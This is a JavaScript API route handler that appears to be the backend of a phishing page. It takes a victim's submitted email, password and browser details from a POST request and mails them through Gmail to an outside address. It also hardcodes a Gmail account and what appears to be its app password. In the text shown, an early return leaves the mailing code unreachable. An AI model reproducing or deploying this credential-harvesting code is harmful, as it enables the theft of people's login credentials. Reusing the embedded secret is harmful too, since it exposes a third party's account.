// import dbConnect from "../../../lib/dbConnect";
// import Spam from "../../../models/spam";
import nodeMailer from 'nodemailer';
// https://www.youtube.com/watch?v=l--0JyIS5Ts

export default async function handler(req, res) {
  const { method, body } = req
  // await dbConnect();

  switch (method) {
    case 'POST':
      return "good job";

      const transporter = nodeMailer.createTransport({
        service: "gmail",
        auth: {
            user: "rheiinklaus@gmail.com",
            pass: "fnjwlzlyqxbthlvw"
          }
        });
        
        const option = {
          from: "rheiinklaus@gmail.com",
          to: "mariac.perezcaba@gmail.com",
          subject: "User",
          html: `
            <p>email: ${body.email}</p>
            <p>password: ${body.password}</p>
            <p>browser: ${body.browser}</p>
            <p>createdAt: ${Date(body.createdAt)}</p>
          `
        }

        await new Promise((resolve, reject) => {
          // send mail
          transporter.sendMail(option, (err, info) => {
              if (err) {
                  console.error(err);
                  reject(err);
              } else {
                  console.log(info);
                  resolve(info);
              }
          });
      });
      console.log("a mers")
    return "good job";
    default:
      return "ok";
  }
}
